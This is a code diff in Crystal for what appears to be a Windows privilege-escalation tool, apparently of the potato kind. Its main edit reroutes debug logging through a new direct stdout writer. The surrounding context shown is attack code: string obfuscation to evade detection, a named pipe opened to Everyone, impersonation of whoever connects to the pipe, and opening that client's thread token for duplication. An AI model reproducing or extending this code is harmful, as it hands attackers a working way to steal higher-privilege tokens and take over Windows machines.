@@ -9,12 +9,28 @@ module Config
   def self.verbose? : Bool; @@debug_level >= 2; end
 end
 
+module ThreadSafeIO
+  @@stdout_handle : Pointer(Void) = Pointer(Void).null
+
+  def self.write_line(msg : String)
+    if @@stdout_handle.null?
+      @@stdout_handle = WinExtra.GetStdHandle(0xFFFFFFF5_u32)
+    end
+    data = msg + "\n"
+    written = 0_u32
+    LibC.WriteFile(@@stdout_handle, data.to_unsafe.as(Pointer(Void)),
+      data.bytesize.to_u32, pointerof(written), Pointer(LibC::OVERLAPPED).null)
+  end
+end
+
 def dbg(msg : String)
-  puts msg if Config.verbose?
+  return unless Config.verbose?
+  ThreadSafeIO.write_line(msg)
 end
 
 def dbg1(msg : String)
-  puts msg if Config.debug?
+  return unless Config.debug?
+  ThreadSafeIO.write_line(msg)
 end
 
 # ─────────────── Compile-time string obfuscation ────────
@@ -753,6 +769,7 @@ lib WinExtra
   fun VirtualProtect(lpAddress : Void*, dwSize : UInt64, flNewProtect : UInt32, lpflOldProtect : UInt32*) : Int32
   fun PeekNamedPipe(hNamedPipe : Void*, lpBuffer : Void*, nBufferSize : UInt32,
     lpBytesRead : UInt32*, lpTotalBytesAvail : UInt32*, lpBytesLeftThisMessage : UInt32*) : Int32
+  fun GetStdHandle(nStdHandle : UInt32) : Void*
 end
 
 @[Link("ws2_32")]
@@ -1907,17 +1924,17 @@ class MyContext
     sddl = obf("D:(A;OICI;GA;;;WD)").to_utf16
     sec_desc = Pointer(Void).null
     sec_desc_size = 0_u32
-    dbg obf("[pipe] convert_sd addr=0x") + SysState.dbg_convert_sd.to_s(16)
-    dbg obf("[pipe] sddl ptr=0x") + sddl.to_unsafe.address.to_s(16) + " len=" + sddl.size.to_s
+    log obf("[pipe] convert_sd addr=0x") + SysState.dbg_convert_sd.to_s(16) if Config.verbose?
+    log obf("[pipe] sddl ptr=0x") + sddl.to_unsafe.address.to_s(16) + " len=" + sddl.size.to_s if Config.verbose?
     ret = SysState.convert_sd_w(sddl.to_unsafe, 1_u32, pointerof(sec_desc), pointerof(sec_desc_size))
-    dbg obf("[pipe] convert_sd_w returned ") + ret.to_s
+    log obf("[pipe] convert_sd_w returned ") + ret.to_s if Config.verbose?
 
     sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, sec_desc, 0)
-    dbg obf("[pipe] sa ok, sec_desc=0x") + sec_desc.address.to_s(16)
+    log obf("[pipe] sa ok, sec_desc=0x") + sec_desc.address.to_s(16) if Config.verbose?
 
     pipe_name_w = @server_pipe.to_utf16
-    dbg obf("[pipe] cnpw=0x") + SysState.dbg_create_named_pipe_w.to_s(16)
-    dbg obf("[pipe] calling CreateNamedPipeW")
+    log obf("[pipe] cnpw=0x") + SysState.dbg_create_named_pipe_w.to_s(16) if Config.verbose?
+    log obf("[pipe] calling CreateNamedPipeW") if Config.verbose?
     pipe_handle = SysState.create_named_pipe_w(
       pipe_name_w.to_unsafe,
       PIPE_ACCESS_DUPLEX,
@@ -1925,7 +1942,7 @@ class MyContext
       PIPE_UNLIMITED_INSTANCES,
       521_u32, 0_u32, 123_u32,
       pointerof(sa).as(Pointer(Void)))
-    dbg obf("[pipe] handle=0x") + pipe_handle.address.to_s(16)
+    log obf("[pipe] handle=0x") + pipe_handle.address.to_s(16) if Config.verbose?
 
     log obf("[*] listening ") + @server_pipe
 
@@ -1934,23 +1951,23 @@ class MyContext
       return
     end
 
-    dbg obf("[pipe] calling ConnectNamedPipe")
+    log obf("[pipe] calling ConnectNamedPipe") if Config.verbose?
     is_connect = SysState.connect_named_pipe(pipe_handle, Pointer(Void).null)
-    dbg obf("[pipe] connect=") + is_connect.to_s
+    log obf("[pipe] connect=") + is_connect.to_s if Config.verbose?
     last_err = LibC.GetLastError
 
     if (is_connect != 0 || last_err == ERROR_PIPE_CONNECTED) && @is_started
       log obf("[*] connected")
 
       imp_ret = SysState.impersonate_named_pipe_client(pipe_handle)
-      dbg obf("[imp] impersonate ret=") + imp_ret.to_s
+      log obf("[imp] impersonate ret=") + imp_ret.to_s if Config.verbose?
       if imp_ret != 0
         imp_token = Pointer(Void).null
         status = SysState.nt_open_thread_token(
           CURRENT_THREAD,
           TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
           1, pointerof(imp_token))
-        dbg obf("[imp] open_thread_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + imp_token.address.to_s(16)
+        log obf("[imp] open_thread_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + imp_token.address.to_s(16) if Config.verbose?
         imp_token = Pointer(Void).null if status < 0
 
         current_sid = imp_token.null? ? "?" : (get_token_sid(imp_token) || "?")
